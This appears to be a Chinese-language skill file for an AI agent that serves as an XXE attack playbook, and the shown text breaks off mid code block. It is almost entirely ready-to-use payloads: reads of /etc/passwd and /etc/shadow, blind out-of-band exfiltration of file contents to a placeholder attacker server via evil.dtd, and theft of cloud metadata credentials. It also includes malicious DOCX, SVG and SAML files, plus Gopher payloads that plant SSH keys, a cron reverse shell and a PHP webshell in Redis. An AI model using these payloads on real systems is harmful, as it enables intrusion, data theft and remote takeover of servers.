---
name: xxe-testing
description: XXE XML外部实体注入测试
version: 1.0.0
---

# XXE XML外部实体注入测试

## 概述

XXE（XML External Entity）注入是一种利用XML解析器处理外部实体的漏洞。本技能覆盖XXE漏洞的检测、利用和防护方法，涵盖文件读取、Blind XXE外带、内网SSRF探测、文件上传场景、XInclude、本地DTD劫持、PHP伪协议编码读取、SOAP/SVG/RSS/SAML注入以及Gopher协议攻击等完整攻击面。

## 漏洞原理

XML解析器在处理外部实体时，若未禁用DTD和外部实体解析，攻击者可构造恶意XML实现：
- 本地文件读取
- SSRF内网探测
- 拒绝服务攻击
- 数据外带

常见存在XXE的场景：
- XML文档解析接口
- SOAP WebService
- Office文档（.docx, .xlsx, .pptx）
- SVG图片上传
- RSS/Atom feed解析
- SAML断言处理
- PDF文件生成

---

## 1. XXE文件读取

### 1.1 基础文件读取（Linux）

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/shadow">
]>
<root>&xxe;</root>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hosts">
]>
<root>&xxe;</root>
```

### 1.2 Windows文件读取

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
]>
<root>&xxe;</root>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<root>&xxe;</root>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/boot.ini">
]>
<root>&xxe;</root>
```

### 1.3 PHP expect 协议执行命令

当目标使用PHP且加载了expect扩展时，可利用expect协议执行系统命令：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<root>&xxe;</root>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://uname -a">
]>
<root>&xxe;</root>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://cat /etc/passwd">
]>
<root>&xxe;</root>
```

### 1.4 利用错误信息读取文件

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///nonexistent">
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  %file;
]>
<root>test</root>
```

---

## 2. Blind XXE 外带

当目标不直接回显文件内容时，需要通过OOB（Out-of-Band）渠道外带数据。

### 2.1 基础OOB外带

**请求payload：**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://YOUR-SERVER:PORT/?data=test">
]>
<root>&xxe;</root>
```

### 2.2 参数实体 + 外部DTD外带

**请求payload：**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://YOUR-SERVER:PORT/evil.dtd">
  %dtd;
]>
<root>test</root>
```

**外部DTD（evil.dtd）：**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-SERVER:PORT/?data=%file;'>">
%eval;
%exfil;
```

### 2.3 参数实体嵌套（核心技巧）

XML中的参数实体嵌套是Blind XXE的关键技术。外层DTD使用参数实体构造新的实体定义：

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % start "<!ENTITY &#x25; send SYSTEM 'http://YOUR-SERVER:PORT/?content=%file;'>">
%start;
%send;
```

此技术的关键点：
- `&#x25;` 是 `%` 的HTML实体编码，用于嵌套定义参数实体
- 外层 `%start;` 被展开，动态创建 `%send;` 实体
- 最终调用 `%send;` 执行外带请求

### 2.4 Base64编码外带

某些目标对特殊字符敏感，可结合PHP伪协议进行Base64编码外带：

**evil.dtd：**
```xml
<!ENTITY % payload SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-SERVER:PORT/?data=%payload;'>">
%eval;
%exfil;
```

**服务器端解码命令：**
```bash
# 收到的Base64内容解码
echo "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaAo=" | base64 -d
```

### 2.5 多文件外带

遍历读取多个敏感文件：

```xml
<!ENTITY % file1 SYSTEM "file:///etc/passwd">
<!ENTITY % file2 SYSTEM "file:///etc/hosts">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-SERVER:PORT/?p=%file1;&h=%file2;'>">
%eval;
%exfil;
```

### 2.6 利用FTP外带

某些出站策略仅允许FTP，可使用FTP协议外带：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://YOUR-SERVER/evil.dtd">
  %dtd;
]>
<root>test</root>
```

**evil.dtd：**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://YOUR-SERVER:2121/%file;'>">
%eval;
%exfil;
```

**监听FTP请求：**
```bash
sudo python -m pyftpdlib -p 2121
```

---

## 3. XXE -> 内网探测（SSRF via XXE）

利用XXE进行SSRF攻击，探测内网服务和端口。

### 3.1 端口扫描

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:22">
]>
<root>&xxe;</root>
```

批量探测内网端口，根据回显差异判断端口状态：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe80 SYSTEM "http://127.0.0.1:80">
  <!ENTITY xxe3306 SYSTEM "http://127.0.0.1:3306">
  <!ENTITY xxe6379 SYSTEM "http://127.0.0.1:6379">
  <!ENTITY xxe8080 SYSTEM "http://127.0.0.1:8080">
  <!ENTITY xxe9200 SYSTEM "http://127.0.0.1:9200">
]>
<root>
  <port80>&xxe80;</port80>
  <port3306>&xxe3306;</port3306>
  <port6379>&xxe6379;</port6379>
  <port8080>&xxe8080;</port8080>
  <port9200>&xxe9200;</port9200>
</root>
```

### 3.2 云元数据攻击

**AWS元数据：**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root>&xxe;</root>
```

**GCP元数据：**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token">
]>
<root>&xxe;</root>
```

**阿里云元数据：**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://100.100.100.200/latest/meta-data/">
]>
<root>&xxe;</root>
```

### 3.3 内网Web应用探测

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://172.16.0.1:8080/actuator">
]>
<root>&xxe;</root>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://10.0.0.1:9000/">
]>
<root>&xxe;</root>
```

### 3.4 使用Blind XXE进行内网探测

当无回显时，通过OOB判断端口状态：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://YOUR-SERVER/scan.dtd">
  %dtd;
]>
<root>test</root>
```

**scan.dtd：**
```xml
<!ENTITY % internal SYSTEM "http://172.16.0.1:8080">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-SERVER/?port=8080&result=%internal;'>">
%eval;
%exfil;
```

---

## 4. 文件上传XXE

### 4.1 SVG文件XXE

SVG基于XML，上传SVG图片时可直接注入XXE payload。

**读取文件：**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="10" y="20" font-size="12">&xxe;</text>
</svg>
```

**SSRF探测：**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="400" height="100">
  <text x="10" y="20" font-size="10">&xxe;</text>
</svg>
```

**Blind SVG外带：**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY % dtd SYSTEM "http://YOUR-SERVER/evil.dtd">
  %dtd;
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <circle cx="50" cy="50" r="40" fill="red"/>
</svg>
```

### 4.2 DOCX / OOXML文件XXE

Office OpenXML文件本质为ZIP压缩包，包含多个XML文件。修改其中的XML可实现XXE。

**手工制作恶意DOCX：**

```bash
# 解压docx
cp target.docx && unzip target.docx -d docx_extracted/
cd docx_extracted

# 修改 word/document.xml 或 word/_rels/document.xml.rels
# 添加XXE payload

# 重新打包
zip -r malicious.docx *
```

**修改word/document.xml：**
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p>
      <w:r>
        <w:t>&xxe;</w:t>
      </w:r>
    </w:p>
  </w:body>
</w:document>
```

**修改word/_rels/document.xml.rels（SSRF）：**
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE Relationships [
  <!ENTITY xxe SYSTEM "http://YOUR-SERVER/exfil">
]>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
  <Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="&xxe;"/>
</Relationships>
```

**自动化工具 - docem：**
```bash
# docem - DOCX OOXML XXE 工具
git clone https://github.com/whitel1st/docem.git
python3 docem.py -s sample.docx -c "file:///etc/passwd" -o output.docx
```

### 4.3 XLSX Excel XXE

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheetData>
    <row r="1">
      <c r="A1">
        <v>&xxe;</v>
      </c>
    </row>
  </sheetData>
</worksheet>
```

### 4.4 PPTX PowerPoint XXE

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<slideshow xmlns="http://schemas.openxmlformats.org/presentationml/2006/main">
  <sld>
    <spTree>
      <sp>
        <txBody>
          <p>
            <r>
              <t>&xxe;</t>
            </r>
          </p>
        </txBody>
      </sp>
    </spTree>
  </sld>
</slideshow>
```

---

## 5. XInclude攻击

当应用程序接收XML片段或用户可控制XML元素内容时，无法直接注入DTD，此时可利用XInclude（XML Inclusions）实现类似XXE的效果。XInclude允许在XML文档中包含其他XML文档的内容。

### 5.1 基础XInclude文件读取

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>
```

### 5.2 XInclude编码绕过

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///%65%74%63/%70%61%73%73%77%64"/>
</root>
```

### 5.3 XInclude路径遍历

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="../../etc/passwd"/>
</root>
```

### 5.4 XInclude SSRF

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="http://169.254.169.254/latest/meta-data/"/>
</root>
```

### 5.5 XInclude Windows文件读取

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///C:/Windows/win.ini"/>
</root>
```

### 5.6 XInclude与编码转换

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd" encoding="UTF-8"/>
</root>
```

### 5.7 XInclude的xpointer属性

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="xml" href="file:///etc/passwd" xpointer="xpointer(/)"/>
</root>
```

### 5.8 XInclude在SOAP中的利用

```xml
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:xi="http://www.w3.org/2001/XInclude">
  <soap:Body>
    <getUser>
      <userId>
        <xi:include parse="text" href="file:///etc/passwd"/>
      </userId>
    </getUser>
  </soap:Body>
</soap:Envelope>
```

### 5.9 XInclude在SVG中的利用

```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg"
     xmlns:xi="http://www.w3.org/2001/XInclude"
     width="500" height="500">
  <text x="10" y="50" font-size="30">
    <xi:include parse="text" href="file:///etc/passwd"/>
  </text>
</svg>
```

---

## 6. 本地DTD文件劫持

当外部网络不可用（无出站）或服务器禁用外部实体时，利用目标系统本地已存在的DTD文件来构建XXE攻击。核心思路是找到包含实体声明的本地DTD文件，并与攻击者定义的参数实体结合。

### 6.1 原理

利用XML解析器中参数实体可以在外部DTD中覆盖定义的特性，通过已有本地DTD文件中的实体声明进行实体注入。

### 6.2 常见本地DTD路径

**Linux/Glibc系统：**
```
/usr/share/xml/fontconfig/fonts.dtd
/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd
/usr/share/dbus-1.0/dbus-xml.dtd
/usr/share/xml/xhtml/xhtml1-strict.dtd
/usr/share/xml/docbook/schema/dtd/4.5/docbook.dtd
/etc/xml/docbook/xml-docbook-4.5/docbookx.dtd
/usr/share/xml/docbook/4.5/docbookx.dtd
/usr/local/share/xml/myspell/myspell.dtd
/usr/share/sgml/sgml-iso-entities-8879.1986/ISOentities.dtd
```

**Java应用：**
```
/usr/share/java/selinux/selinux-java-policy.dtd
/usr/share/java/jsp/dtd/web-jsptaglib_1_2.dtd
/usr/share/java/jsp/dtd/web-app_2_4.dtd
/usr/share/java/tomcat-coyote.dtd
/usr/share/java/jakarta-slide/webdroid/conf.dtd
```

**Windows系统：**
```
C:/Windows/System32/wbem/xml/cim20.dtd
C:/Program Files/Microsoft Office/Office15/ADDLOCAL.XML
```

### 6.3 利用fonts.dtd劫持

利用Linux系统自带的 fonts.dtd：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % constant "file:///etc/passwd">
  <!ENTITY % fonts_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
  %fonts_dtd;
]>
<foo>test</foo>
```

### 6.4 利用docbookx.dtd劫持

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "file:///usr/share/xml/docbook/schema/dtd/4.5/docbookx.dtd">
  %dtd;
]>
<foo>&file;</foo>
```

### 6.5 应用层DTD劫持

许多Web框架自带DTD文件可用于劫持：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "file:///usr/local/tomcat/webapps/ROOT/WEB-INF/web.dtd">
  %dtd;
]>
<foo>&file;</foo>
```

### 6.6 利用DTD中的参数实体注入

某些DTD包含间接参数实体引用，可用于绕过限制：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
  %dtd;
  <!ENTITY % local_entity "test">
]>
<foo>&file;</foo>
```

### 6.7 本地DTD + OOB组合

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
  %dtd;
]>
<foo>test</foo>
```

配合外带服务器，当外部网络不可用时，在evildtd中使用本地DTD引用：

**evil.dtd：**
```xml
<!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
<!ENTITY % file SYSTEM "file:///etc/passwd">
%local_dtd;
```

---

## 7. PHP伪协议编码读取

当目标为PHP应用时，可利用PHP支持的多种流封装协议进行编码读取和绕过。

### 7.1 Base64编码读取

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
]>
<root>&xxe;</root>
```

### 7.2 多种编码链读取

**Rot13编码：**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode|convert.rot13/resource=/etc/passwd">
]>
<root>&xxe;</root>
```

**字符串替换编码：**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/read=convert.iconv.utf-8.utf-16|convert.base64-encode/resource=/etc/passwd">
]>
<root>&xxe;</root>
```

### 7.3 链式编码组合

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode|zlib.deflate/resource=/etc/passwd">
]>
<root>&xxe;</root>
```

### 7.4 读取PHP源代码

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
]>
<root>&xxe;</root>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=../config.php">
]>
<root>&xxe;</root>
```

### 7.5 利用data://协议执行代码

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "data://text/plain;base64,dGVzdA==">
]>
<root>&xxe;</root>
```

### 7.6 expect://协议（需安装expect扩展）

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<root>&xxe;</root>
```

### 7.7 多种PHP伪协议总结

| 协议 | 功能 | 示例 |
|------|------|------|
| php://filter | 编码读取文件 | php://filter/read=convert.base64-encode/resource=/etc/passwd |
| php://input | 读取请求体 | php://input |
| php://memory | 读写内存流 | php://memory |
| expect:// | 执行命令 | expect://id |
| data:// | 内联数据 | data://text/plain;base64,dGVzdA== |
| file:// | 文件系统 | file:///etc/passwd |

### 7.8 压缩协议读取

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "compress.zlib://file:///etc/passwd">
]>
<root>&xxe;</root>
```

---

## 8. SOAP XXE注入

SOAP WebService解析XML消息，是XXE的高发场景。

### 8.1 基础SOAP XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getUser>
      <userId>&xxe;</userId>
    </getUser>
  </soap:Body>
</soap:Envelope>
```

### 8.2 SOAP Blind XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://YOUR-SERVER/evil.dtd">
  %dtd;
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <authenticate>
      <username>admin</username>
      <password>test</password>
    </authenticate>
  </soap:Body>
</soap:Envelope>
```

### 8.3 SOAP SSRF

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/internal">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <processOrder>
      <orderId>&xxe;</orderId>
    </processOrder>
  </soap:Body>
</soap:Envelope>
```

### 8.4 SOAP Header注入

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <authToken>&xxe;</authToken>
  </soap:Header>
  <soap:Body>
    <getData/>
  </soap:Body>
</soap:Envelope>
```

### 8.5 SOAP XInclude

```xml
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:xi="http://www.w3.org/2001/XInclude">
  <soap:Body>
    <processUser>
      <username>
        <xi:include parse="text" href="file:///etc/passwd"/>
      </username>
    </processUser>
  </soap:Body>
</soap:Envelope>
```

### 8.6 WSDL XXE

某些SOAP服务加载WSDL时也处理XML实体：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<wsdl:definitions xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/"
                  targetNamespace="http://example.com/">
  <wsdl:documentation>&xxe;</wsdl:documentation>
</wsdl:definitions>
```

---

## 9. SVG / RSS / SAML XXE注入

### 9.1 SVG XXE深入利用

**文件读取：**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="100">
  <text font-family="Arial" font-size="20" x="10" y="50">&xxe;</text>
</svg>
```

**SSRF探测内网：**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://192.168.1.1:80">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="100">
  <image href="&xxe;" width="500" height="100"/>
</svg>
```

**Blind SVG外带：**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY % dtd SYSTEM "http://YOUR-SERVER/evil.dtd">
  %dtd;
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <rect width="100" height="100" fill="blue"/>
</svg>
```

**SVG XInclude组合：**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg"
     xmlns:xi="http://www.w3.org/2001/XInclude"
     width="500" height="300">
  <foreignObject width="500" height="300">
    <xi:include parse="text" href="file:///etc/passwd"/>
  </foreignObject>
</svg>
```

### 9.2 RSS XXE注入

**RSS 2.0 XXE：**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rss [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<rss version="2.0">
  <channel>
    <title>&xxe;</title>
    <link>http://example.com</link>
    <description>RSS Feed</description>
    <item>
      <title>Item</title>
      <link>http://example.com/item</link>
      <description>&xxe;</description>
    </item>
  </channel>
</rss>
```

**RSS Blind外带：**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rss [
  <!ENTITY % dtd SYSTEM "http://YOUR-SERVER/evil.dtd">
  %dtd;
]>
<rss version="2.0">
  <channel>
    <title>Test Feed</title>
    <link>http://example.com</link>
    <description>RSS</description>
  </channel>
</rss>
```

**Atom Feed XXE：**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE feed [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>&xxe;</title>
  <entry>
    <title>Entry</title>
    <content>&xxe;</content>
  </entry>
</feed>
```

### 9.3 SAML XXE注入

SAML断言基于XML，身份提供商(IdP)或服务提供商(SP)解析SAML消息时可能受XXE影响。

**SAMLResponse XXE：**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE saml:Assertion [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="ID_123"
                IssueInstant="2026-06-11T00:00:00Z"
                Version="2.0">
  <saml:Issuer>https://idp.example.com</saml:Issuer>
  <saml:Subject>
    <saml:NameID>&xxe;</saml:NameID>
  </saml:Subject>
  <saml:AttributeStatement>
    <saml:Attribute Name="role">
      <saml:AttributeValue>&xxe;</saml:AttributeValue>
    </saml:Attribute>
  </saml:AttributeStatement>
</saml:Assertion>
```

**SAMLRequest XXE：**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE samlp:AuthnRequest [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                    ID="ID_456"
                    Version="2.0"
                    IssueInstant="2026-06-11T00:00:00Z"
                    Destination="https://sp.example.com/acs">
  <saml:Issuer>&xxe;</saml:Issuer>
</samlp:AuthnRequest>
```

**SAML Blind XXE：**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE saml:Assertion [
  <!ENTITY % dtd SYSTEM "http://YOUR-SERVER/evil.dtd">
  %dtd;
]>
<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="ID_789"
                Version="2.0">
  <saml:Issuer>https://idp.example.com</saml:Issuer>
  <saml:Subject>
    <saml:NameID>admin</saml:NameID>
  </saml:Subject>
</saml:Assertion>
```

**SAML XInclude：**
```xml
<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                xmlns:xi="http://www.w3.org/2001/XInclude"
                ID="ID_101"
                Version="2.0">
  <saml:Issuer>
    <xi:include parse="text" href="file:///etc/passwd"/>
  </saml:Issuer>
</saml:Assertion>
```

---

## 10. Gopher协议攻击内网服务

Gopher协议是一种TCP层协议，支持发送任意字节到任意TCP端口，常用于SSRF攻击中构造复杂协议的交互数据。

### 10.1 Gopher协议基础

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/_DATA">
]>
<root>&xxe;</root>
```

Gopher协议格式：`gopher://host:port/_` 后跟URL编码后的TCP数据。

### 10.2 攻击Redis（未授权访问）

Redis 6379端口，通过Gopher发送Redis命令写入SSH公钥或反弹Shell。

**写入SSH公钥：**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/_%2A%33%0D%0A%24%33%0D%0Aset%0D%0A%24%31%34%0D%0Assh%2Dkey%2Dtest%0D%0A%24%33%32%33%0D%0A%73%73%68%2D%72%73%61%20%41%41%41%41%41%2E%2E%2E%20%72%73%61%2D%6B%65%79%0D%0A%2A%31%0D%0A%24%34%0D%0Asave%0D%0A">
]>
<root>&xxe;</root>
```

**Redis 反弹Shell：**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/_%2A%31%0D%0A%24%38%0D%0Aflushall%0D%0A%2A%33%0D%0A%24%33%0D%0Aset%0D%0A%24%31%34%0D%0Acron%2Dtest%0D%0A%24%36%35%0D%0A%2A%2F%31%20%2A%20%2A%20%2A%20%2A%20%2F%62%69%6E%2F%62%61%73%68%20%2D%69%20%3E%26%20%2F%64%65%76%2F%74%63%70%2F%59%4F%55%52%2D%49%50%2F%38%30%38%30%20%30%3E%26%31%0A%0D%0A%2A%31%0D%0A%24%34%0D%0Asave%0D%0A">
]>
<root>&xxe;</root>
```

**Redis 写Webshell：**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/_%2A%33%0D%0A%24%33%0D%0Aset%0D%0A%24%39%0D%0Awebshell%0D%0A%24%32%34%0D%0A%3C%3F%70%68%70%20%73%79%73%74%65%6D%28%24%5F%47%45%54%5B%27%63%6D%64%27%5D%29%3B%3F%3E%0D%0A%2A%34%0D%0A%24%36%0D%0Aconfig%0D%0A%24%33%0D%0Aset%0D%0A%24%31%30%0D%0Adir%20%2Fvar%2Fwww%2Fhtml%0D%0A%2A%34%0D%0A%24%36%0D%0Aconfig%0D%0A%24%35%0D%0Aset%0D%0A%24%31%30%0D%0Adbfilename%20shell%2Ephp%0D%0A%2A%31%0D%0A%24%34%0D%0Asave%0D%0A">
]>
<root>&xxe;</root>
```

### 10.3 攻击MySQL

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "gopher://127.0.0.1:3306/_QUERYDATA">
]>
<root>&xxe;</root>
```

**MySQL读取文件：**
```xml
